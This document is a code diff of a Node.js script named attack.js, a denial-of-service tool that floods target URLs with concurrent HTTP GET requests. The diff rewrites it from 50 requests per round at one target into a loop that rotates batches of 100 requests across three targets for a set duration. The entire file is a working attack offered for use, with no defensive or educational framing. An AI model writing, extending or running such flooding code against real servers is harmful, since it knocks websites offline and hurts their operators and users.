@@ -1,53 +1,51 @@
 const axios = require('axios');
-const async = require('async');
 
-const target = process.argv[2]; // Target URL (passed as command line argument)
-const duration = parseInt(process.argv[3]); // Duration in seconds (passed as command line argument)
-const maxRequests = 50; // Max simultaneous requests per round
+const target1 = process.argv[2];
+const target2 = process.argv[3];
+const target3 = process.argv[4];
+const duration = parseInt(process.argv[5]); // in ms
 
-if (!target || isNaN(duration) || duration <= 0 || duration > 500000) {
-    console.error('Usage: node attack.js <target_url> <duration_in_seconds>');
-    process.exit(1);
+if (!target1 || !target2 || !target3 || isNaN(duration) || duration <= 0 || duration > 500000) {
+  console.error('Usage: node attack.js <target1> <target2> <target3> <duration_in_ms>');
+  process.exit(1);
 }
 
-console.log(`Attacking target: ${target} for ${duration} seconds...`);
+const MAX_TIMEOUT = 25000;
+const CONCURRENT_REQUESTS = 100;
 
-// Function to send a single request
-const sendRequest = async () => {
-    try {
-        const response = await axios.get(target, {timeout: 25000}); // Wait for max 25 seconds for a response
-        console.log(`Response received from ${target}: ${response.status}`);
-    } catch (error) {
-        console.error(`Error accessing ${target}: ${error.message}`);
-    }
-};
+let isRunning = true;
+const targets = [target1, target2, target3];
 
-// Function to send multiple requests at once and wait for all responses
-const sendMultipleRequests = async () => {
-    const tasks = [];
+async function sendRequest(url, id) {
+  try {
+    const res = await axios.get(url, { timeout: MAX_TIMEOUT });
+    console.log(`[${url}] #${id} - ${res.status}`);
+  } catch (err) {
+    console.log(`[${url}] #${id} - Error: ${err.message}`);
+  }
+}
 
-    // Add 'maxRequests' tasks (requests) to the array
-    for (let i = 0; i < maxRequests; i++) {
-        tasks.push(sendRequest);
-    }
+async function attackLoop() {
+  let requestCount = 0;
 
-    // Use async to send all requests concurrently
-    await async.parallel(tasks);
-};
+  while (isRunning) {
+    const batch = [];
 
-// Function to continuously send requests for the specified duration
-const startAttack = async () => {
-    const endTime = Date.now() + duration * 1000; // Convert duration to milliseconds
-
-    // Keep sending requests until the duration expires
-    while (Date.now() < endTime) {
-        console.log(`Sending ${maxRequests} requests...`);
-        await sendMultipleRequests(); // Send requests and wait for all responses
-        console.log(`Completed round of ${maxRequests} requests.`);
+    for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
+      const url = targets[i % 3]; // Rotate between targets
+      requestCount++;
+      batch.push(sendRequest(url, requestCount));
     }
 
-    console.log('Attack completed!');
-};
+    await Promise.allSettled(batch);
+  }
+}
+
+// Stop attack after duration
+setTimeout(() => {
+  console.log(`Finished attack after ${duration}ms`);
+  isRunning = false;
+}, duration);
 
 // Start the attack
-startAttack();
+attackLoop();
